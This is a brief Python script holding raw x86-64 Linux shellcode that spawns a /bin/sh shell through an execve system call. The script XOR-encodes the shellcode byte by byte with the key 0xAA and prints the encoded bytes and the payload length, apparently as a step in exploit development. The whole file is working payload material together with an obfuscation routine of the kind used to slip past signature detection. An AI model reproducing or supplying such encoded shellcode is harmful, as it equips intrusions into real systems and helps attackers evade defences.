shellcode=(b"\x48\x31\xc0\xb0\x3b\x48\x31\xc9\x51\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05")
encoded2=""

print ('Encoded shellcode ...')

for x in bytearray(shellcode):

    y=x^0xAA

    encoded2+='0x'
    encoded2+='%02x,' %y

print (encoded2)

print ('Len: %d' % len(bytearray(shellcode)))

